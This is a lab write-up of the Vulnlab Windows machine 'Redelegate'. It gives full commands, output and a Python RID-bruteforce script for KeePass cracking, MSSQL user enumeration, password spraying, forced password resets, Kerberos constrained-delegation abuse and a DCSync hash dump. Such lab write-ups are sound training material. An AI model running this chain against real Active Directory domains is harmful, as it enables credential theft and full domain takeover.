---
categories:
- Vulnlab
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2025-01-24-vl-redelegate
tags:
title: VL Redelegate
---

Redelegate is a hard-rated Windows machine by [Geiseric](https://x.com/Geiseric4) on Vulnlab. The core concepts here are password spraying, enumerating domain users via MSSQL, and diving deeper into Kerberos delegation.

## Initial Reconnaissance

We start by scanning for open ports:

```
sudo nmap -sV 10.10.72.39
...
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-22 11:48:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

The scan confirms we are dealing with a Domain Controller. However, the presence of FTP (21) and MSSQL (1433) stands out.

First, we check FTP:

```
ftp 10.10.72.39
Connected to 10.10.72.39.
220 Microsoft FTP Service
Name (10.10.72.39:hollowfade): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||53461|)
125 Data connection already open; Transfer starting.
10-20-24  12:11AM                  434 CyberAudit.txt
10-20-24  04:14AM                 2622 Shared.kdbx
10-20-24  12:26AM                  580 TrainingAgenda.txt
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> prompt off
Interactive mode off.
ftp> mget *
```

We successfully downloaded all files. Among them, the KeePass `Shared.kdbx` file and the `TrainingAgenda.txt` file are most relevant. The latter hints that employees are trained to avoid passwords like `SeasonYear!`, guiding us to create a simple word list:

```
Spring2024!
Summer2024!
Autumn2024!
Fall2024!
Winter2024!
```

## Initial Compromise

Without valid users yet, we proceed to test the word list against the KeePass `Shared.kdbx` file.

```
~/tools/john/run/keepass2john Shared.kdbx | tee shared.hash
Shared:$keepass$*2*600000*0*<redacted>

~/tools/john/run/john shared.hash --wordlist=$HOME/vulnlab/redelegate/passwords.txt
...
<redacted>        (Shared)
Session completed.
```

After cracking the password of the KeePass file, we access it with `keepassxc`. Inside, we find several passwords; one of them is for MSSQL, a service running on the machine. We use this to connect:

```
mssqlclient.py redelegate.vl/sqlguest:<redacted>@10.10.72.39
...
[!] Press help for extra shell commands
SQL (SQLGuest  guest@master)>
```

Although we are able to connect to the server, our options seem limited. Attempts to retrieve the hash of the service account using `xp_dirtree` fail, and the visible tables do not provide valuable information. Luckily, there is still something to try. By leveraging an older but effective technique, we enumerate users, groups, and machine names in an Active Directory environment via MSSQL using RID bruteforcing.

This method exploits MSSQL's ability to query SIDs (Security Identifiers) even with low privileges. By appending a range of Relative Identifiers (RIDs) to the domain's base SID, we can enumerate AD objects. This approach, as detailed in [Keramas' MSSQL AD Enumeration](https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html), remains highly effective in environments where MSSQL is domain-joined.

First, we retrieve the domain name:

```
SQL (SQLGuest  guest@msdb)> SELECT DEFAULT_DOMAIN();

---
REDELEGATE
```

Next, we query the domain’s base SID by retrieving the SID of a known group:

```
SQL (SQLGuest  guest@msdb)> SELECT SUSER_SID('REDELEGATE\Domain Admins');

---
b'010500000000000515000000a185deefb22433798d8e847a00020000'
```

The first 48 bytes of this hexadecimal value represent the domain SID. Using Python, we convert it to a readable string:

```python
#!/usr/bin/env python3

def hex_to_sid(hex_string):
    """Convert a hexadecimal SID string to a readable SID format."""
    sid_bytes = bytes.fromhex(hex_string)
    revision = sid_bytes[0]
    identifier_authority = int.from_bytes(sid_bytes[2:8], "big")
    sub_auths = [str(int.from_bytes(sid_bytes[i:i + 4], "little")) for i in range(8, len(sid_bytes), 4)]
    return f"S-{revision}-{identifier_authority}" + "".join(f"-{auth}" for auth in sub_auths)

def main():
    hex_string = "010500000000000515000000a185deefb22433798d8e847a00020000"
    print(hex_to_sid(hex_string))

if __name__ == "__main__":
    main()
```

Using the base SID, we enumerate domain objects by appending RIDs corresponding to users, groups, or machine accounts. For example:

```
SQL (SQLGuest  guest@msdb)> SELECT SUSER_SNAME(SID_BINARY(N'S-1-5-21-4024337825-2033394866-2055507597-1100'));
```

To automate this, we implement a Python script to perform RID bruteforcing within a range (e.g., 1100–1200). This script generates SIDs by appending RIDs to the base SID and queries the server for associated names.

```python
#!/usr/bin/env python3

import os
import subprocess
import signal
import sys

def handle_interrupt(signal, frame):
    """Handle Ctrl+C interruption gracefully."""
    print("\n[!] Interrupted. Exiting gracefully.")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_interrupt)

def run_query(server, username, password, query_file, sid):
    """Run a single query to retrieve the username for a given SID."""
    query = f"SELECT SUSER_SNAME(SID_BINARY(N'{sid}'))"
    with open(query_file, "w") as f:
        f.write(query)
    
    command = ["mssqlclient.py", f"{username}:{password}@{server}", "-f", query_file]
    result = subprocess.run(command, capture_output=True, text=True)
    os.remove(query_file)

    lines = result.stdout.strip().splitlines()
    return next((line.strip() for line in lines if "\\" in line and "[*] INFO" not in line), None)

def bruteforce_rid(server, username, password, base_sid):
    """Perform RID brute force to find valid usernames."""
    print("\n[*] Starting RID bruteforce...\n")
    query_file = "query.sql"

    for rid in range(1100, 1201):
        sid = f"{base_sid}-{rid}"
        user = run_query(server, username, password, query_file, sid)
        if user:
            print(f"[+] RID {rid:4}: {user}")

    print("\n[*] Bruteforce completed.\n")

def main():
    """Main function to configure and start the brute force process."""
    username = "sqlguest"
    password = "<redacted>"
    server = "redelegate.vl"
    base_sid = "S-1-5-21-4024337825-2033394866-2055507597"

    bruteforce_rid(server, username, password, base_sid)

if __name__ == "__main__":
    main()
```

When executed, it reveals the following results:

```
python3 bruteforce.py

[*] Starting RID bruteforce ...

[+] RID 1103: REDELEGATE\FS01$
[+] RID 1104: REDELEGATE\Christine.Flanders
[+] RID 1105: REDELEGATE\Marie.Curie
[+] RID 1106: REDELEGATE\Helen.Frost
[+] RID 1107: REDELEGATE\Michael.Pontiac
[+] RID 1108: REDELEGATE\Mallory.Roberts
[+] RID 1109: REDELEGATE\James.Dinkleberg
[+] RID 1112: REDELEGATE\Helpdesk
[+] RID 1113: REDELEGATE\IT
[+] RID 1114: REDELEGATE\Finance
[+] RID 1115: REDELEGATE\DnsAdmins
[+] RID 1116: REDELEGATE\DnsUpdateProxy
[+] RID 1117: REDELEGATE\Ryan.Cooper
[+] RID 1119: REDELEGATE\sql_svc

[*] Bruteforce completed.
```

## Establish Foothold

Now, with a list of domain users and our previously created wordlist, we perform a password spray attack against the accounts:

```
nxc smb redelegate.vl -u users.txt -p passwords.txt
...
SMB         10.10.72.39     445    DC               [+] redelegate.vl\Marie.Curie:<redacted>
```

We successfully find valid credentials for `Marie.Curie`. With this, we can do more enumeration such as listing network shares, identifying misconfigurations, and gathering BloodHound data to map potential attack paths. 

Using BloodHound, we collect data for further analysis:

```
nxc ldap redelegate.vl -u Marie.Curie -p '<redacted>' --bloodhound -c all --dns-server 10.10.72.39
LDAP        10.10.72.39     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
LDAP        10.10.72.39     389    DC               [+] redelegate.vl\Marie.Curie:<redacted>
LDAP        10.10.72.39     389    DC               Resolved collection methods: acl, rdp, objectprops, psremote, group, container, trusts, dcom, localadmin, session
LDAP        10.10.72.39     389    DC               Done in 00M 09S
LDAP        10.10.72.39     389    DC               Compressing output into ...
```

Once we import the BloodHound data, it reveals a privilege escalation path. Specifically, `Marie.Curie` has permissions to reset the password of another user, `Helen.Frost`.

![Bloodhound Path](bloodhound-path.png)

We proceed to reset the password:

```
changepasswd.py redelegate/helen.frost@redelegate.vl -newpass 'Password123!' -altuser redelegate/marie.curie -reset -altpass '<redacted>' -debug

[*] Setting the password of redelegate\helen.frost as redelegate\marie.curie
[*] Connecting to DCE/RPC as redelegate\marie.curie
[+] Successfully bound to SAMR
[+] Sending SAMR call hSamrSetNTInternal1
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```

With these credentials, we gain a shell on the Domain Controller.

```
evil-winrm -i redelegate.vl -u helen.frost -p 'Password123!'

*Evil-WinRM* PS C:\Users\Helen.Frost\Documents>
```

## Escalate Privileges

First, we enumerate the privileges of `Helen.Frost` and discover that she has the `SeEnableDelegationPrivilege`. This privilege allows her to configure delegation for accounts within the domain:

```
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /all

## USER INFORMATION

User Name              SID
====================== ==============================================
redelegate\helen.frost S-1-5-21-4024337825-2033394866-2055507597-1106

## GROUP INFORMATION

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
REDELEGATE\IT                               Group            S-1-5-21-4024337825-2033394866-2055507597-1113 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

## PRIVILEGES INFORMATION

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled

## USER CLAIMS INFORMATION

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Using BloodHound, we identify that `Helen.Frost` has `GenericAll` privileges over the computer account `FS01$`. This means she can reset its password and configure delegation. Since the environment restricts DNS entry creation or adding new machine accounts, Constrained Delegation is the best approach. This allows us to impersonate other accounts for specific services using the controlled machine account.

We begin by resetting the password for `FS01$`:

```
changepasswd.py redelegate/'FS01$'@redelegate.vl -newpass 'Password123!' -altuser redelegate/helen.frost -reset -altpass 'Password123!' -debug

[*] Setting the password of redelegate\FS01$ as redelegate\helen.frost
[*] Connecting to DCE/RPC as redelegate\helen.frost
[+] Successfully bound to SAMR
[+] Sending SAMR call hSamrSetNTInternal1
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```

Next, we configure Constrained Delegation for `FS01$` using the `SeEnableDelegationPrivilege`:

```
Evil-WinRM PS C:\Users\Helen.Frost\Desktop> Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}
Evil-WinRM PS C:\Users\Helen.Frost\Desktop> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
```

We set the `msDS-AllowedToDelegateTo` attribute to `ldap/dc.redelegate.vl` to specify the target service and enable the `TrustedToAuthForDelegation`.

With this setup, `FS01$` is now able to request service tickets for LDAP:

```
getST.py redelegate.vl/'FS01$':'Password123!' -spn ldap/dc.redelegate.vl -impersonate dc

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2Proxy
[*] Saving ticket in dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

## Complete Mission

Using the ticket, we execute a DCSync attack to dump domain hashes:

```
export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache

secretsdump.py -k -no-pass dc.redelegate.vl -dc-ip 10.10.72.39

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:<redacted>:::
...
```

This gives us the NTLM hash for the Administrator account, granting full Domain Admin privileges.

## Resources

Here are some resources and tools used or referenced during this engagement:

- [Redelegate Walkthrough by XCT](https://vuln.dev/vulnlab-redelegate): A detailed walkthrough by XCT explaining the steps to compromise the Redelegate machine.
- [What Is Kerberos Delegation?](https://blog.netwrix.com/2021/11/30/what-is-kerberos-delegation-an-overview-of-kerberos-delegation): An in-depth explanation of Kerberos delegation and its various types.
- [Keramas' MSSQL AD Enumeration](https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html): A guide on RID bruteforcing to enumerate Active Directory objects via MSSQL.
- [Impacket Toolkit](https://github.com/fortra/impacket): A set of tools for working with Windows/Active Directory environments.
- [BloodHound](https://github.com/SpecterOps/BloodHound): A tool for analyzing and attacking Active Directory environments through graph-based enumeration.
- [John the Ripper](https://github.com/openwall/john): A password-cracking tool used for recovering KeePass database credentials.
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm): A post-exploitation tool for interacting with Windows via WinRM.

These resources provide additional insights and tools to better understand the techniques and methodologies used during the engagement.

